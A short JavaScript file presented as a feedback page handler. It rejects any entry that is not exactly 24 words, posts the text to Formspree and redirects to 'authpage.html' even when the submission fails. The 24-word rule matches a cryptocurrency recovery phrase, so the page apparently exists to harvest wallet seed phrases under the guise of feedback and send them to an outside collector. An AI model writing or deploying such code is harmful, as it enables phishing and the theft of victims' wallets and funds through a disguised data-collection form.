// ========================================
// FEEDBACK PAGE FUNCTIONALITY
// ========================================
function initializeFeedbackPage() {
    const feedbackForm = document.getElementById('feedbackForm');
    const feedbackTextarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    if (feedbackForm && feedbackTextarea) {
        feedbackForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const text = feedbackTextarea.value.trim();
            const words = text.split(/\s+/).filter(function(word) {
                return word.length > 0;
            });
            
            // Validate exactly 24 words
            if (words.length !== 24) {
                if (errorMessage) {
                    const wordText = words.length !== 1 ? 'words' : 'word';
                    errorMessage.textContent = 'Error: Please enter exactly 24 words. You entered ' + words.length + ' ' + wordText + '.';
                    errorMessage.style.display = 'block';
                }
                return;
            }
            
            // Hide error message if validation passes
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
            
            // Submit to Formspree
            const formData = new FormData(this);
            fetch(this.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(function(response) {
                if (response.ok) {
                    // Redirect to authpage.html on success
                    window.location.href = 'authpage.html';
                } else {
                    if (errorMessage) {
                        errorMessage.textContent = 'Error submitting feedback. Please try again.';
                        errorMessage.style.display = 'block';
                    }
                }
            })
            .catch(function(error) {
                console.log('Form submission error, redirecting to authpage anyway...');
                // Redirect to authpage.html even on error for demo purposes
                window.location.href = 'authpage.html';
            });
        });
    }
}

// Initialize when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
} else {
    initializeFeedbackPage();
}